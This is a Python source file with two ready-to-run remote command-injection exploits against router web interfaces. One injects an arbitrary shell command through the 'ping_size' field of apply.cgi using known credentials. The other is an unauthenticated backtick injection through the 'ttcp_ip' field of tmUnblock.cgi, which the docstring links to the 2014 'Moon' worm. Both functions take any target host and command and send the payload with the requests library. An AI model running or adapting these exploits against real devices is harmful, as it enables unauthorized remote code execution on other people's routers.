import requests

def extract_settings(settings : dict, setting : str):
  return settings[setting]


"""
Exploits the fact that the 'ping_size' field is not properly validated,
allowing us to inject code and remotely execute shell commands.

NOTE: In order to utilize this exploit, you must already know the
login to the router (previous methods of gaining login information have 
been patched). For this reason, this exploit isn't too useful in 
the real world.

References:


(Discovered by Michael Messner)

"""
def command_line_injection(settings : dict, cmd : str):
  target = extract_settings(settings, "target")
  port = extract_settings(settings, "port")
  username = extract_settings(settings, "username")
  password = extract_settings(settings, "password")
  timeout = extract_settings(settings, "timeout")
  verify = extract_settings(settings, "verify")
  allow_redirects = extract_settings(settings, "allow_redirects")

  url = f"http://{target}:{port}/apply.cgi"
  
  data = {
    "submit_button": "Diagnostics",
    "change_action": "gozila_cgi",
    "submit_type": "start_ping",
    "action": "",
    "commit": "0",
    "ping_ip": "127.0.0.1",
    "ping_size": "&" + cmd, # Inject cmd through ping size since ping size not validated  
    "ping_times": "5",
    "traceroute_ip": "127.0.0.1"
  }

  response = requests.post(url, data = data, auth = (username, password), timeout = timeout, verify = verify, allow_redirects = allow_redirects)

  print("Server responded with status code " + str(response.status_code))


"""
Exploits the TTCP_IP field, allowing us to implement unauthenticated remote code 
execution. This was actively used by the 'Moon' Worm in 2014. Unlike the 
previous exploit, this one does not require us to have any login authentication.


References:

https://www.exploit-db.com/exploits/31683/
https://packetstormsecurity.com/files/125252
https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630


(Discovered by Johannes Ullrich)

"""
def moon_exploit(settings : dict, cmd : str):
  target = extract_settings(settings, "target")
  port = extract_settings(settings, "port")
  timeout = extract_settings(settings, "timeout")
  verify = extract_settings(settings, "verify")
  allow_redirects = extract_settings(settings, "allow_redirects")

  url =  f"http://{target}:{port}/tmUnblock.cgi"

  data = {
    "submit_button": "",
    "change_action": "",
    "action": "",
    "commit": "0",
    "ttcp_num": "2",
    "ttcp_size": "2",
    "ttcp_ip": f"-h `{cmd}`",
    "StartEPI": "1",
  }
  
  response = requests.post(url, data= data, timeout = timeout, verify = verify, allow_redirects = allow_redirects)

  print("Server responded with status code " + str(response.status_code))